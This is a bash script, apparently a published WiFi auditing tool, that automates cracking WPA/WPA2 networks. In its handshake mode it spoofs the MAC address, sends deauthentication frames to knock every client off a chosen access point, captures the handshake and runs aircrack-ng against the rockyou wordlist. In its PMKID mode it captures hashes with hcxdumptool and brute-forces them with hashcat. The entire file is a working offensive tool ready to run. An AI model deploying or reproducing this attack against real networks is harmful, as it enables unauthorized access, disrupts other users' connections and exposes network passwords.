#!/bin/bash

# Author: s4vitar - nmap y pa' dentro
# Contributors: omgs, J0rd1s3rr4n0

# Colors
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Dictionary path
wordList="/usr/share/wordlists/rockyou.txt"
wordListDir=$(dirname $wordList)
commonDeps="aircrack-ng macchanger wget git make"

# Flag to restart NetworkManager at the end
NetworkManager="1"

export DEBIAN_FRONTEND=noninteractive

trap ctrl_c INT

function ctrl_c() {
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Exiting${endColour}"
    tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
    rm Captura* 2>/dev/null
    exit 0
}

function helpPanel() {
    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usage: ./${0}${endColour}"
    echo -e "\n\t${purpleColour}a)${endColour}${yellowColour} Attack mode${endColour}"
    echo -e "\t\t${redColour}Handshake${endColour}"
    echo -e "\t\t${redColour}PKMID${endColour}"
    echo -e "\t${purpleColour}n)${endColour}${yellowColour} Network interface name${endColour}"
    echo -e "\t${purpleColour}h)${endColour}${yellowColour} Show this help panel${endColour}\n"
    exit 0
}

function checkDependencies() {
    tput civis
    clear;

    echo -e "${yellowColour}[*]${endColour}${grayColour} Checking required programs...${endColour}"
    sleep 2

    checkInstallPackages $commonDeps

    # Check wordList
    if [ ! -d $wordListDir ]; then
        echo -e "${redColour}WordList directory does not exist. Creating...${endColour}\n"
        mkdir -p $wordListDir
    fi
    if [ ! -f $wordList ]; then
        echo "${redColour}Wordlist not found. Downloading...${endColour}\n"
        wget -O $wordList -N -nd 'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
    fi

    if [[ "$attack_mode" == "PKMID" ]]; then
        # Check for recent versions of hashcat and hcxtools
        hashcat=""
        if [[ -f $(which hashcat) ]]; then
            # Check if hashcat version is at least v6.X
            if [[ $(hashcat -V) > "v5" ]]; then
                hashcat="1"
            fi
        fi
        # Download sources in /usr/src
        pushd /usr/src >/dev/null
        # Not installed or has an old version
        if [[ -z $hashcat ]]; then
            checkInstallPackages libcurl4-openssl-dev libssl-dev pkg-config
            echo -e "${redColour}Hashcat is either missing or outdated. Downloading...${endColour}\n"
            git clone https://github.com/hashcat/hashcat.git
            cd hashcat
            make && make install && apt remove -y hashcat 2>/dev/null
            hash -r
            cd ..
        fi
        if [[ ! -f $(which hcxpcapngtool) ]]; then
            echo -e "${redColour}Hcxtools is either missing or outdated. Downloading...${endColour}\n"
            git clone https://github.com/ZerBea/hcxtools
            cd hcxtools
            make && make install
            cd ..
            git clone https://github.com/ZerBea/hcxdumptool
            cd hcxdumptool
            make && make install
            cd ..
        fi
        popd >/dev/null
    fi
}

function autoWlan() {
    networkCard=""
    echo -e "\n${yellowColour}Detecting network interface...${endColour}"
    for iface in $(grep ':' /proc/net/dev|cut -d: -f1); do
        iwconfig $iface >/dev/null 2>&1
        if [ $? == 0 ]; then
            networkCard=$iface
            echo -e "${greenColour}OK: $iface${endColour}\n"
        fi
    done
    if [[ -z $networkCard ]]; then
        echo -e "${redColour}NETWORK INTERFACE NOT DETECTED${endColour}\n"
        echo "End of the program"
        exit 1
    fi
}

function checkInstallPackages() {
    for package in $@; do
        echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Tool${endColour}${purpleColour} $package${endColour}${blueColour}...${endColour}"

        if [[ $(dpkg -L $package 2>/dev/null|wc -l) != "0" ]]; then
            echo -e " ${greenColour}(V)${endColour}"
        else
            echo -e " ${redColour}(X)${endColour}\n"
            echo -e "${yellowColour}[*]${endColour}${grayColour} Installing package ${endColour}${blueColour}$program${endColour}${yellowColour}...${endColour}"
            apt-get install $package -y > /dev/null 2>&1
        fi
        sleep 1
    done
}

function startAttack() {
    if [[ "$networkCard" == "auto" ]]; then
        autoWlan
    fi
    # NetworkManager detection
    NM=""
    if [[ $(which nmcli) ]]; then
        if [[ $(nmcli d | grep -w ^${networkCard} | awk '{ print $4 }') != "--" ]]; then
            NM="1"
            nmcli dev set ${networkCard} managed no
        fi
    fi
    clear
    echo -e "${yellowColour}[*]${endColour}${grayColour} Configuring network interface...${endColour}\n"
    airmon-ng start $networkCard > /dev/null 2>&1
    ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon > /dev/null 2>&1
    ifconfig ${networkCard}mon up; killall dhclient wpa_supplicant 2>/dev/null

    echo -e "${yellowColour}[*]${endColour}${grayColour} New MAC address assigned ${endColour}${purpleColour}[${endColour}${blueColour}$(macchanger -s ${networkCard}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}${purpleColour}]${endColour}"

    if [ "$(echo $attack_mode)" == "Handshake" ]; then

        xterm -hold -e "airodump-ng ${networkCard}mon" &
        airodump_xterm_PID=$!
        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Access Point Name: ${endColour}" && read apName
        echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Access Point Channel: ${endColour}" && read apChannel

        kill -9 $airodump_xterm_PID
        wait $airodump_xterm_PID 2>/dev/null

        xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" &
        airodump_filter_xterm_PID=$!

        sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &
        aireplay_xterm_PID=$!
        sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

        sleep 10; kill -9 $airodump_filter_xterm_PID
        wait $airodump_filter_xterm_PID 2>/dev/null

        xterm -hold -e "aircrack-ng -w $wordList Captura-01.cap" &
    elif [ "$(echo $attack_mode)" == "PKMID" ]; then
        clear; echo -e "${yellowColour}[*]${endColour}${grayColour} Starting ClientLess PKMID Attack...${endColour}\n"
        sleep 2
        timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --enable_status=1 -o Captura"
        echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Getting Hashes...${endColour}\n"
        sleep 2
        hcxpcapngtool --pmkid=myHashes Captura; rm Captura 2>/dev/null
        test -f myHashes

        if [ "$(echo $?)" == "0" ]; then
            echo -e "\n${yellowColour}[*]${endColour}${grayColour} Starting Brute Force Process...${endColour}\n"
            sleep 2

            hashcat -m 16800 myHashes $wordList -d 1 --force
        else
            echo -e "\n${redColour}[!]${endColour}${grayColour} Unable to capture the required packet...${endColour}\n"
            rm Captura* 2>/dev/null
            sleep 2
        fi
    else
        echo -e "\n${redColour}[*] This attack mode is not valid${endColour}\n"
    fi
}

# Main Function

if [ "$(id -u)" == "0" ]; then
    declare -i parameter_counter=0; while getopts ":a:n:h:" arg; do
        case $arg in
            a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
            n) networkCard=$OPTARG; let parameter_counter+=1 ;;
            h) helpPanel;;
        esac
    done

    if [ $parameter_counter -ne 2 ]; then
        helpPanel
    else
        checkDependencies
        startAttack
        tput cnorm; airmon-ng stop ${networkCard}mon > /dev/null 2>&1
        if [[ ! -z "NM" ]]; then
            nmcli dev set ${networkCard} managed yes
            service wpa_supplicant restart
            #service network-manager restart
        fi
    fi
else
    echo -e "\n${redColour}[*] Not running as root${endColour}\n"
fi
